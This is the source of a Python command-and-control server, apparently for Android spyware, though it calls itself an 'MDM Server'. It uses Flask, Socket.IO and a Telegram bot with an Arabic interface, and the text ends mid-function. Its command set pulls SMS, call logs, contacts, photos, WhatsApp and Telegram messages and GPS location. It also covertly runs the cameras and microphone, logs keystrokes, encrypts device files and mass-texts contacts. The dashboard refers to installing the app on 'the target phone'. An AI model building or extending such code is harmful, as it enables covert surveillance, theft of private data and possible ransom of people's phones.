"""
MDM Server v7.0 - Beautiful Redesigned Bot UI
Flask + Socket.IO + REST API + Telegram Bot
NO DATABASE - In-memory dict only
Short device IDs (#1, #2, #3...)
Auto bot alert when device connects
HTML-formatted bot messages - BEAUTIFUL & ORGANIZED
"""
import eventlet
eventlet.monkey_patch()

import hashlib
import hmac
import logging
import os
import sys
import time
import threading
import uuid
from datetime import datetime, timedelta, timezone

from flask import Flask, jsonify, make_response, request
from flask_socketio import SocketIO, emit, disconnect
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from dotenv import load_dotenv

load_dotenv()

# ═══════════════════════════════════════════════════════════════════════
# 1. CONFIG
# ═══════════════════════════════════════════════════════════════════════

class Config:
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", "")
    ADMIN_IDS: list[int] = [int(u.strip()) for u in os.getenv("ADMIN_IDS", "").split(",") if u.strip().isdigit()]
    PORT: int = int(os.getenv("MDM_PORT", os.getenv("PORT", 5000)))
    SECRET_KEY: str = os.getenv("MDM_SECRET_KEY", "")
    E2E_KEY: str = os.getenv("E2E_KEY", "")
    LIVE_ACCESS_KEY: str = os.getenv("LIVE_ACCESS_KEY", "")
    SERVER_URL: str = os.getenv("SELF_PING_URL", os.getenv("SERVER_URL", "https://b-lpf3.onrender.com"))
    HEARTBEAT_TIMEOUT: int = 300

    @classmethod
    def validate(cls) -> list[str]:
        errors = []
        if not cls.BOT_TOKEN or cls.BOT_TOKEN == "your_bot_token_here":
            errors.append("BOT_TOKEN")
        if not cls.ADMIN_IDS:
            errors.append("ADMIN_IDS")
        return errors


# ═══════════════════════════════════════════════════════════════════════
# 2. IN-MEMORY DEVICE STORE (NO DATABASE)
# ═══════════════════════════════════════════════════════════════════════

class DeviceStore:
    """Simple in-memory device storage with short IDs"""

    def __init__(self):
        self._devices: dict[str, dict] = {}      # device_id -> {short_id, model, version, ip, status, ...}
        self._sid_map: dict[str, str] = {}        # sid -> device_id
        self._next_id: int = 1
        self._lock = threading.Lock()

    def register_or_update(self, device_id, sid, model=None, version=None, ip=None, extra_info=None):
        with self._lock:
            is_new = device_id not in self._devices

            if is_new:
                short_id = self._next_id
                self._next_id += 1
                self._devices[device_id] = {
                    "short_id": short_id,
                    "device_id": device_id,
                    "sid": sid,
                    "model": model or "Unknown",
                    "version": version or "?",
                    "ip": ip or "",
                    "status": "online",
                    "banned": False,
                    "ban_reason": None,
                    "last_seen": datetime.now(timezone.utc),
                    "created_at": datetime.now(timezone.utc),
                    "extra_info": extra_info,
                }
            else:
                dev = self._devices[device_id]
                if dev["banned"]:
                    return dev, False, "الجهاز محظور"
                old_sid = dev.get("sid")
                if old_sid and old_sid in self._sid_map:
                    del self._sid_map[old_sid]
                dev["sid"] = sid
                if model: dev["model"] = model
                if version: dev["version"] = version
                if ip: dev["ip"] = ip
                if extra_info: dev["extra_info"] = extra_info
                dev["status"] = "online"
                dev["last_seen"] = datetime.now(timezone.utc)

            self._sid_map[sid] = device_id
            dev = self._devices[device_id]
            msg = "تم تسجيل الجهاز" if is_new else "تم تحديث الجهاز"
            return dev, is_new, msg

    def handle_disconnect(self, sid):
        with self._lock:
            did = self._sid_map.pop(sid, None)
            if not did: return
            dev = self._devices.get(did)
            if dev and dev.get("sid") == sid:
                dev["status"] = "offline"
                dev["sid"] = None
                dev["last_seen"] = datetime.now(timezone.utc)

    def handle_heartbeat(self, sid):
        with self._lock:
            did = self._sid_map.get(sid)
            if not did: return None
            dev = self._devices.get(did)
            if dev and not dev["banned"]:
                dev["last_seen"] = datetime.now(timezone.utc)
                dev["status"] = "online"
            return dev

    def ban_device(self, device_id, reason=None):
        with self._lock:
            dev = self._devices.get(device_id)
            if not dev: return False, "غير موجود"
            dev["banned"] = True
            dev["ban_reason"] = reason
            dev["status"] = "banned"
            return True, f"تم حظر #{dev['short_id']}"

    def unban_device(self, device_id):
        with self._lock:
            dev = self._devices.get(device_id)
            if not dev: return False, "غير موجود"
            dev["banned"] = False
            dev["ban_reason"] = None
            dev["status"] = "offline"
            return True, f"تم إلغاء حظر #{dev['short_id']}"

    def delete_device(self, device_id):
        with self._lock:
            dev = self._devices.pop(device_id, None)
            if not dev: return False, "غير موجود"
            for sid, did in list(self._sid_map.items()):
                if did == device_id:
                    del self._sid_map[sid]
            return True, f"تم حذف #{dev['short_id']}"

    def get_device(self, device_id):
        return self._devices.get(device_id)

    def get_all_devices(self):
        return sorted(self._devices.values(), key=lambda d: d.get("created_at", datetime.min.replace(tzinfo=timezone.utc)), reverse=True)

    def get_online_devices(self):
        return [d for d in self._devices.values() if d["status"] == "online"]

    def get_banned_devices(self):
        return [d for d in self._devices.values() if d["banned"]]

    def get_device_by_sid(self, sid):
        did = self._sid_map.get(sid)
        return self._devices.get(did) if did else None

    def get_sid_for_device(self, device_id):
        for sid, did in self._sid_map.items():
            if did == device_id:
                return sid
        return None

    def get_stats(self):
        return {
            "total": len(self._devices),
            "online": sum(1 for d in self._devices.values() if d["status"] == "online"),
            "offline": sum(1 for d in self._devices.values() if d["status"] == "offline"),
            "banned": sum(1 for d in self._devices.values() if d["banned"]),
        }

    def cleanup_stale(self, timeout_seconds=300):
        threshold = datetime.now(timezone.utc) - timedelta(seconds=timeout_seconds)
        count = 0
        with self._lock:
            for dev in self._devices.values():
                if dev["status"] == "online" and dev.get("last_seen", datetime.min.replace(tzinfo=timezone.utc)) < threshold:
                    dev["status"] = "offline"
                    dev["sid"] = None
                    count += 1
        return count


# ═══════════════════════════════════════════════════════════════════════
# 3. COMMAND REGISTRY
# ═══════════════════════════════════════════════════════════════════════

CATEGORIES = {
    "data":           {"label": "📦 سحب بيانات",       "emoji": "📦"},
    "camera":         {"label": "📷 كاميرا وشاشة",    "emoji": "📷"},
    "audio":          {"label": "🎤 صوت",              "emoji": "🎤"},
    "control":        {"label": "🎮 أدوات تحكم",       "emoji": "🎮"},
    "advanced":       {"label": "⚡ أوامر متقدمة",     "emoji": "⚡"},
    "info":           {"label": "ℹ️ معلومات",          "emoji": "ℹ️"},
    "app_monitoring": {"label": "📱 مراقبة التطبيقات", "emoji": "📱"},
}

COMMANDS = {
    # data
    "contacts":       {"category": "data",   "label": "👥 جهات الاتصال", "description": "سحب جهات الاتصال",          "needs_param": False},
    "all-sms":        {"category": "data",   "label": "💬 الرسائل",          "description": "سحب الرسائل النصية",       "needs_param": False},
    "calls":          {"category": "data",   "label": "📞 سجل المكالمات",    "description": "سحب سجل المكالمات",       "needs_param": False},
    "apps":           {"category": "data",   "label": "📱 التطبيقات",        "description": "سحب التطبيقات المثبتة",    "needs_param": False},
    "gallery":        {"category": "data",   "label": "🖼 المعرض",            "description": "سحب صور المعرض",          "needs_param": False},
    "gmail":          {"category": "data",   "label": "📧 Gmail",            "description": "إشعارات Gmail",           "needs_param": False},
    "whatsapp-messages": {"category": "data", "label": "💬 واتساب",        "description": "سحب رسائل الواتساب",      "needs_param": False},
    "telegram-messages": {"category": "data", "label": "✈️ تيليجرام",      "description": "سحب رسائل تيليجرام",      "needs_param": False},
    "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
    # camera
    "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
    "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
    "screenshot":     {"category": "camera", "label": "📸 لقطة شاشة",        "description": "أخذ لقطة شاشة حقيقية",    "needs_param": False},
    # audio
    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون",     "needs_param": False},
    "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
    "stopAudio":      {"category": "audio",  "label": "🔇 إيقاف الصوت",      "description": "إيقاف الصوت",              "needs_param": False},
    # control
    "toast":              {"category": "control", "label": "💬 رسالة Toast",      "description": "رسالة منبثقة",          "needs_param": True, "param_hint": "نص الرسالة"},
    "vibrate":            {"category": "control", "label": "📳 اهتزاز",            "description": "تشغيل الاهتزاز",          "needs_param": False},
    "sendSms":            {"category": "control", "label": "📤 إرسال SMS",       "description": "إرسال رسالة نصية",       "needs_param": True, "param_hint": "رقم:نص الرسالة"},
    "makeCall":           {"category": "control", "label": "📞 إجراء مكالمة",     "description": "مكالمة هاتفية",           "needs_param": True, "param_hint": "رقم الهاتف"},
    "device-policy-lock": {"category": "control", "label": "🔒 قفل الجهاز",       "description": "قفل شاشة الجهاز",       "needs_param": False},
    "popNotification":    {"category": "control", "label": "🔔 إشعار",            "description": "إظهار إشعار",             "needs_param": True, "param_hint": "عنوان:نص"},
    "smsToAllContacts":   {"category": "control", "label": "📨 SMS للجميع",      "description": "SMS لكل جهات الاتصال",   "needs_param": True, "param_hint": "نص الرسالة"},
    # advanced
    "input-monitoring-on":  {"category": "advanced", "label": "⌨️ مراقبة الإدخال", "description": "مراقبة لوحة المفاتيح",    "needs_param": False},
    "input-monitoring-off": {"category": "advanced", "label": "⏹ إيقاف المراقبة", "description": "إيقاف المراقبة",           "needs_param": False},
    "apply-data-protection": {"category": "advanced", "label": "🔐 حماية البيانات",      "description": "تشفير الملفات محلياً",   "needs_param": False},
    "pull-videos":           {"category": "advanced", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
    "stop-videos":           {"category": "advanced", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
    "stop-gallery":          {"category": "advanced", "label": "⏹ إيقاف المعرض",    "description": "إيقاف سحب المعرض",      "needs_param": False},
    # info
    "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
    "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "عرض ملفات في مسار",  "needs_param": True, "param_hint": "/sdcard/DCIM"},
    "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
    # app_monitoring
    "app-monitor-start":  {"category": "app_monitoring", "label": "🟢 تفعيل المراقبة", "description": "بدء مراقبة التطبيقات",     "needs_param": False},
    "app-monitor-stop":   {"category": "app_monitoring", "label": "🔴 إيقاف المراقبة", "description": "إيقاف مراقبة التطبيقات",   "needs_param": False},
    "app-usage-report":   {"category": "app_monitoring", "label": "📊 تقرير الاستخدام",       "description": "تقرير استخدام التطبيقات",   "needs_param": False},
    "app-notifications":  {"category": "app_monitoring", "label": "🔔 الإشعارات",      "description": "مراقبة إشعارات التطبيقات",  "needs_param": False},
    "running-apps":       {"category": "app_monitoring", "label": "📱 التطبيقات النشطة",      "description": "التطبيقات قيد التشغيل",     "needs_param": False},
    "kill-app":           {"category": "app_monitoring", "label": "❌ إيقاف تطبيق",           "description": "إيقاف تطبيق محدد",          "needs_param": True, "param_hint": "com.app.name"},
}

def get_commands_by_category(cat):
    return [c for c, i in COMMANDS.items() if i["category"] == cat]

def build_command_payload(cmd_type, params=None):
    cmd = COMMANDS.get(cmd_type)
    if not cmd: return None
    p = {"command": cmd_type, "category": cmd["category"],
         "timestamp": datetime.now(timezone.utc).isoformat()}
    if params and cmd["needs_param"]:
        if isinstance(params, dict):
            p["params"] = params
        else:
            p["params"] = {"value": str(params)}
    return p


# ═══════════════════════════════════════════════════════════════════════
# 4. TELEGRAM KEYBOARDS - BEAUTIFUL & ORGANIZED
# ═══════════════════════════════════════════════════════════════════════

def _cb(device_id, action, target):
    return f"{action}:{device_id}:{target}"

def _cbtn(device_id, cmd_type):
    i = COMMANDS[cmd_type]
    a = "param" if i["needs_param"] else "cmd"
    return InlineKeyboardButton(i["label"], callback_data=_cb(device_id, a, cmd_type))

def _back(device_id):
    return InlineKeyboardButton("🔙 رجوع", callback_data=_cb(device_id, "kb", "control_panel"))

def _home_btn():
    return InlineKeyboardButton("🏠 الرئيسية", callback_data="menu:home")

# ── Main Control Panel ──
def control_panel_keyboard(did, banned=False):
    kb = InlineKeyboardMarkup(row_width=2)
    # Section 1: Data Collection
    kb.add(
        InlineKeyboardButton("📦 سحب بيانات", callback_data=_cb(did,"kb","data")),
        InlineKeyboardButton("📷 كاميرا وشاشة", callback_data=_cb(did,"kb","camera"))
    )
    # Section 2: Audio & Control
    kb.add(
        InlineKeyboardButton("🎤 صوت", callback_data=_cb(did,"kb","audio")),
        InlineKeyboardButton("🎮 أدوات تحكم", callback_data=_cb(did,"kb","tools"))
    )
    # Section 3: Advanced & Info
    kb.add(
        InlineKeyboardButton("⚡ أوامر متقدمة", callback_data=_cb(did,"kb","advanced")),
        InlineKeyboardButton("ℹ️ معلومات", callback_data=_cb(did,"kb","info"))
    )
    # Section 4: App Monitoring (full width)
    kb.add(InlineKeyboardButton("📱 مراقبة التطبيقات", callback_data=_cb(did,"kb","app_monitoring")))
    # Section 5: Device Management (separate section)
    kb.add(
        InlineKeyboardButton("📋 تفاصيل الجهاز", callback_data=_cb(did,"info_act","")),
    )
    if banned:
        kb.add(
            InlineKeyboardButton("✅ إلغاء الحظر", callback_data=_cb(did,"unban","")),
        )
    else:
        kb.add(
            InlineKeyboardButton("⛔ حظر", callback_data=_cb(did,"ban","")),
        )
    kb.add(
        InlineKeyboardButton("🔌 طرد", callback_data=_cb(did,"kick","")),
        InlineKeyboardButton("🗑 حذف", callback_data=_cb(did,"delete",""))
    )
    return kb

# ── Data Commands Keyboard ──
def data_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
    kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
    kb.add(_cbtn(did,"gallery"), _cbtn(did,"gmail"))
    kb.add(_cbtn(did,"whatsapp-messages"), _cbtn(did,"telegram-messages"))
    kb.add(_cbtn(did,"get-location"))
    kb.add(_back(did))
    return kb

# ── Camera & Screen Keyboard ──
def camera_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
    kb.add(_cbtn(did,"screenshot"))
    kb.add(_back(did))
    return kb

# ── Audio Keyboard ──
def audio_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"microphone"), _cbtn(did,"playAudio"))
    kb.add(_cbtn(did,"stopAudio"))
    kb.add(_back(did))
    return kb

# ── Control Tools Keyboard ──
def tools_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"toast"), _cbtn(did,"vibrate"))
    kb.add(_cbtn(did,"sendSms"), _cbtn(did,"makeCall"))
    kb.add(_cbtn(did,"device-policy-lock"), _cbtn(did,"popNotification"))
    kb.add(_cbtn(did,"smsToAllContacts"))
    kb.add(_back(did))
    return kb

# ── Advanced Keyboard ──
def advanced_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
    kb.add(_cbtn(did,"apply-data-protection"))
    kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
    kb.add(_cbtn(did,"stop-gallery"))
    kb.add(_back(did))
    return kb

# ── Info Keyboard ──
def info_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"get-device-info"), _cbtn(did,"ls"))
    kb.add(_back(did))
    return kb

# ── App Monitoring Keyboard ──
def app_monitoring_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"app-monitor-start"), _cbtn(did,"app-monitor-stop"))
    kb.add(_cbtn(did,"app-usage-report"), _cbtn(did,"app-notifications"))
    kb.add(_cbtn(did,"running-apps"), _cbtn(did,"kill-app"))
    kb.add(_back(did))
    return kb

_KB = {"control_panel": control_panel_keyboard, "data": data_keyboard, "camera": camera_keyboard,
       "audio": audio_keyboard, "tools": tools_keyboard, "advanced": advanced_keyboard,
       "info": info_keyboard, "app_monitoring": app_monitoring_keyboard}

_KB_TITLE = {"control_panel": "⚙ لوحة التحكم", "data": "📦 سحب بيانات", "camera": "📷 كاميرا وشاشة",
             "audio": "🎤 صوت", "tools": "🎮 أدوات تحكم", "advanced": "⚡ أوامر متقدمة",
             "info": "ℹ️ معلومات", "app_monitoring": "📱 مراقبة التطبيقات"}


# ═══════════════════════════════════════════════════════════════════════
# 5. HELPER: Device display label with short ID
# ═══════════════════════════════════════════════════════════════════════

def _dev_label(dev):
    """Short label: #1 Samsung Galaxy S22"""
    sid = dev.get("short_id", "?")
    model = dev.get("model", "?")
    return f"#{sid} {model}"

def _dev_status_emoji(dev):
    return {"online": "🟢", "offline": "🔴", "banned": "⛔"}.get(dev.get("status", ""), "⚪")

def _time_ago(dt):
    """Human readable time ago"""
    if not dt: return "?"
    now = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    diff = now - dt
    seconds = int(diff.total_seconds())
    if seconds < 60: return "الآن"
    elif seconds < 3600: return f"منذ {seconds // 60} دقيقة"
    elif seconds < 86400: return f"منذ {seconds // 3600} ساعة"
    else: return f"منذ {seconds // 86400} يوم"


# ═══════════════════════════════════════════════════════════════════════
# 6. BEAUTIFUL MESSAGE FORMATTING
# ═══════════════════════════════════════════════════════════════════════

def _format_dashboard(stats, devices):
    """Beautiful main dashboard HTML"""
    lines = [
        "<b>🛡 نظام إدارة الأجهزة</b>",
        "",
        f"┌ <b>📊 الملخص</b>",
        f"├ 🟢 متصل: <b>{stats['online']}</b>",
        f"├ 🔴 غير متصل: <b>{stats['offline']}</b>",
        f"├ ⛔ محظور: <b>{stats['banned']}</b>",
        f"└ 📱 الإجمالي: <b>{stats['total']}</b>",
        "",
    ]

    if not devices:
        lines.append("❌ <b>لا توجد أجهزة مسجلة</b>")
        lines.append("")
        lines.append("ثبّت التطبيق على الهاتف المستهدف")
        lines.append("وفعّل جميع الأذونات المطلوبة.")
        return "\n".join(lines)

    # Online devices first
    online = [d for d in devices if d["status"] == "online"]
    offline = [d for d in devices if d["status"] == "offline"]
    banned = [d for d in devices if d["banned"]]

    if online:
        lines.append("┌ <b>🟢 الأجهزة المتصلة</b>")
        for d in online:
            ago = _time_ago(d.get("last_seen"))
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
        lines.append("│")

    if offline:
        lines.append("┌ <b>🔴 غير متصلة</b>")
        for d in offline[:5]:  # Show max 5 offline
            ago = _time_ago(d.get("last_seen"))
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
        if len(offline) > 5:
            lines.append(f"└ ... و {len(offline) - 5} أخرى")
        lines.append("│")

    if banned:
        lines.append("┌ <b>⛔ محظورة</b>")
        for d in banned:
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')}")
        lines.append("│")

    lines.append("")
    lines.append("👇 اختر جهازاً للتحكم به")

    return "\n".join(lines)


def _format_device_card(dev):
    """Beautiful device info card"""
    se = _dev_status_emoji(dev)
    status_text = {"online": "متصل الآن", "offline": "غير متصل", "banned": "محظور"}.get(dev.get("status", ""), dev.get("status", "?"))
    ago = _time_ago(dev.get("last_seen"))

    lines = [
        f"<b>{se} #{dev['short_id']} {dev.get('model', '?')}</b>",
        "",
        f"┌ <b>📋 التفاصيل</b>",
        f"├ 📱 النموذج: {dev.get('model', '?')}",
        f"├ 📲 الإصدار: Android {dev.get('version', '?')}",
        f"├ 🌐 IP: <code>{dev.get('ip', '?')}</code>",
        f"├ 📡 الحالة: {status_text}",
        f"├ 👁 آخر ظهور: {ago}",
        f"├ ⛔ محظور: {'نعم' if dev.get('banned') else 'لا'}",
        f"└ 📅 التسجيل: {dev.get('created_at', datetime.min.replace(tzinfo=timezone.utc)).strftime('%Y-%m-%d %H:%M') if dev.get('created_at') else '-'}",
        "",
        "👇 اختر الأمر من الأزرار أدناه",
    ]
    return "\n".join(lines)


def _format_category_header(cat_key, dev):
    """Beautiful category page header"""
    label = _KB_TITLE.get(cat_key, cat_key)
    model = dev.get("model", "?") if dev else "?"
    sid = dev.get("short_id", "?") if dev else "?"
    se = _dev_status_emoji(dev) if dev else "⚪"

    return (
        f"<b>{label}</b>\n\n"
        f"{se} <b>#{sid} {model}</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"اختر الأمر:"
    )


def _format_cmd_sent(dev, command, params=None):
    """Beautiful command sent confirmation"""
    short_label = _dev_label(dev)
    lbl = COMMANDS.get(command, {}).get("label", command)
    desc = COMMANDS.get(command, {}).get("description", "")

    lines = [
        f"<b>⚡ تم إرسال الأمر فوراً</b>",
        "",
        f"┌ <b>📋 تفاصيل الأمر</b>",
        f"├ 📱 الجهاز: <b>{short_label}</b>",
        f"├ ⚙ الأمر: {lbl}",
        f"├ 📝 الوصف: {desc}",
    ]
    if params:
        lines.append(f"├ 📋 المعامل: <code>{params}</code>")
    lines.append("└ ⏳ جاري الانتظار...")
    lines.append("")
    lines.append("ستصلك النتيجة تلقائياً")

    return "\n".join(lines)


def _format_cmd_result(dev, command, status, data=None, error=None):
    """Beautiful command result"""
    short_label = _dev_label(dev)
    lbl = COMMANDS.get(command, {}).get("label", command)

    if status == "success" and data:
        text_resp = str(data) if not isinstance(data, str) else data
        if len(text_resp) > 3000:
            text_resp = text_resp[:3000] + "\n... (مقتطع)"
        return (
            f"<b>📥 نتيجة الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"✅ <b>نجاح</b>\n\n"
            f"<code>{text_resp}</code>"
        )
    elif status == "error":
        return (
            f"<b>❌ خطأ في الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚠ {error or 'غير معروف'}"
        )
    elif status == "permission_required":
        perms = data if isinstance(data, list) else []
        perm_list = "\n".join(f"  • {p}" for p in perms) if perms else "غير محدد"
        return (
            f"<b>🔒 صلاحيات مطلوبة</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"{perm_list}"
        )
    else:
        return (
            f"<b>📋 حالة الأمر</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {lbl}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📌 {status}"
        )


# ═══════════════════════════════════════════════════════════════════════
# 7. TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════════════

class MDMBot:
    def __init__(self, dm: DeviceStore, socketio=None):
        self.dm, self.socketio = dm, socketio
        self.bot = telebot.TeleBot(Config.BOT_TOKEN)
        self._pending: dict[int, dict] = {}
        self._register()

    def _ok(self, uid): return uid in Config.ADMIN_IDS

    @staticmethod
    def _guard(f):
        def w(self, m):
            uid = m.from_user.id
            if not self._ok(uid):
                logger.warning(f"محظور: uid={uid} chat={m.chat.id}")
                self.bot.reply_to(m, "⛔ غير مصرح.")
                return
            return f(self, m)
        return w

    def _notify_device_connect(self, dev):
        """Send auto-alert when device connects"""
        if not self.bot: return
        short_id = dev.get("short_id", "?")
        model = dev.get("model", "Unknown")
        version = dev.get("version", "?")
        ip = dev.get("ip", "?")

        html = (
            f"<b>🟢 جهاز جديد متصل!</b>\n\n"
            f"┌ <b>📋 التفاصيل</b>\n"
            f"├ 📱 الجهاز: <b>#{short_id}</b>\n"
            f"├ 📦 النموذج: {model}\n"
            f"├ 📲 الإصدار: Android {version}\n"
            f"└ 🌐 IP: <code>{ip}</code>"
        )
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(InlineKeyboardButton(f"⚙ التحكم في #{short_id}", callback_data=f"menu:select:{dev['device_id']}"))
        for admin_id in Config.ADMIN_IDS:
            try:
                self.bot.send_message(admin_id, html, parse_mode="HTML", reply_markup=kb)
            except Exception as e:
                logger.error(f"فشل إرسال تنبيه البوت: {e}")

    def _register(self):
        bot = self.bot

        @bot.message_handler(commands=["start"])
        def _s(m):
            uid = m.from_user.id
            if not self._ok(uid):
                bot.reply_to(m, "⛔ غير مصرح - معرفك غير في قائمة المديرين.")
                return

            devs = self.dm.get_all_devices()
            online_devs = self.dm.get_online_devices()
            stats = self.dm.get_stats()

            # Build beautiful dashboard
            dashboard_text = _format_dashboard(stats, devs)

            # Build keyboard based on device state
            if not devs:
                kb = InlineKeyboardMarkup(row_width=1)
                kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))
            elif len(online_devs) == 1:
                # Auto-open control panel for single online device
                dev = online_devs[0]
                kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
            elif len(online_devs) > 1:
                kb = InlineKeyboardMarkup(row_width=1)
                for d in online_devs:
                    kb.add(InlineKeyboardButton(f"🟢 #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                kb.add(InlineKeyboardButton("📋 كل الأجهزة", callback_data="menu:devices"))
            else:
                kb = InlineKeyboardMarkup(row_width=1)
                for d in devs:
                    se = _dev_status_emoji(d)
                    kb.add(InlineKeyboardButton(f"{se} #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))

            bot.send_message(m.chat.id, dashboard_text, parse_mode="HTML", reply_markup=kb)

        @bot.message_handler(commands=["help"])
        @MDMBot._guard
        def _h(m):
            bot.send_message(
                m.chat.id,
                "<b>🛡 دليل الاستخدام</b>\n\n"
                "• /start — لوحة التحكم الرئيسية\n"
                "• /devices — قائمة الأجهزة\n"
                "• /online — الأجهزة المتصلة\n"
                "• /stats — الإحصائيات\n"
                "• /cancel — إلغاء إدخال معامل\n\n"
                "👇 استخدم الأزرار للتحكم",
                parse_mode="HTML"
            )

        @bot.message_handler(commands=["devices"])
        @MDMBot._guard
        def _d(m):
            devs = self.dm.get_all_devices()
            if not devs:
                bot.reply_to(m, "📭 لا توجد أجهزة مسجلة بعد.")
                return
            lines = [f"<b>📱 قائمة الأجهزة</b> ({len(devs)})\n"]
            for d in devs:
                se = _dev_status_emoji(d)
                ago = _time_ago(d.get("last_seen"))
                lines.append(f"{se} <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["online"])
        @MDMBot._guard
        def _o(m):
            devs = self.dm.get_online_devices()
            if not devs:
                bot.reply_to(m, "🔴 لا توجد أجهزة متصلة حالياً.")
                return
            lines = [f"<b>🟢 الأجهزة المتصلة</b> ({len(devs)})\n"]
            for d in devs:
                lines.append(f"🟢 <b>#{d['short_id']}</b> {d.get('model', '?')} | <code>{d.get('ip', '?')}</code>")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["banned"])
        @MDMBot._guard
        def _b(m):
            devs = self.dm.get_banned_devices()
            if not devs:
                bot.reply_to(m, "✅ لا توجد أجهزة محظورة.")
                return
            lines = [f"<b>⛔ الأجهزة المحظورة</b> ({len(devs)})\n"]
            for d in devs:
                lines.append(f"⛔ <b>#{d['short_id']}</b> {d.get('model', '?')}")
            bot.reply_to(m, "\n".join(lines), parse_mode="HTML")

        @bot.message_handler(commands=["stats"])
        @MDMBot._guard
        def _st(m):
            s = self.dm.get_stats()
            bot.send_message(m.chat.id,
                f"<b>📊 الإحصائيات</b>\n\n"
                f"┌ 📱 إجمالي الأجهزة: <b>{s['total']}</b>\n"
                f"├ 🟢 متصل الآن: <b>{s['online']}</b>\n"
                f"├ 🔴 غير متصل: <b>{s['offline']}</b>\n"
                f"└ ⛔ محظور: <b>{s['banned']}</b>",
                parse_mode="HTML"
            )

        # ── معالج أزرار القائمة الرئيسية ──
        @bot.callback_query_handler(func=lambda c: c.data.startswith("menu:"))
        def _menu_handler(c: CallbackQuery):
            if not self._ok(c.from_user.id):
                bot.answer_callback_query(c.id, "⛔ غير مصرح")
                return
            parts = c.data.split(":")
            action = parts[1] if len(parts) > 1 else "home"
            cid = c.message.chat.id
            mid = c.message.message_id

            if action in ("home", "refresh"):
                devs = self.dm.get_all_devices()
                online_devs = self.dm.get_online_devices()
                stats = self.dm.get_stats()

                dashboard_text = _format_dashboard(stats, devs)

                if not devs:
                    kb = InlineKeyboardMarkup(row_width=1)
                    kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))
                elif len(online_devs) == 1:
                    dev = online_devs[0]
                    kb = control_panel_keyboard(dev["device_id"], dev.get("banned", False))
                elif len(online_devs) > 1:
                    kb = InlineKeyboardMarkup(row_width=1)
                    for d in online_devs:
                        kb.add(InlineKeyboardButton(f"🟢 #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                    kb.add(InlineKeyboardButton("📋 كل الأجهزة", callback_data="menu:devices"))
                else:
                    kb = InlineKeyboardMarkup(row_width=1)
                    for d in devs:
                        se = _dev_status_emoji(d)
                        kb.add(InlineKeyboardButton(f"{se} #{d['short_id']} {d.get('model', '?')}", callback_data=f"menu:select:{d['device_id']}"))
                    kb.add(InlineKeyboardButton("🔄 تحديث", callback_data="menu:home"))

                bot.edit_message_text(dashboard_text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action == "select":
                did = parts[2] if len(parts) > 2 else ""
                dev = self.dm.get_device(did)
                if not dev:
                    bot.answer_callback_query(c.id, "الجهاز غير موجود", show_alert=True)
                    return
                text = _format_device_card(dev)
                kb = control_panel_keyboard(did, dev.get("banned", False))
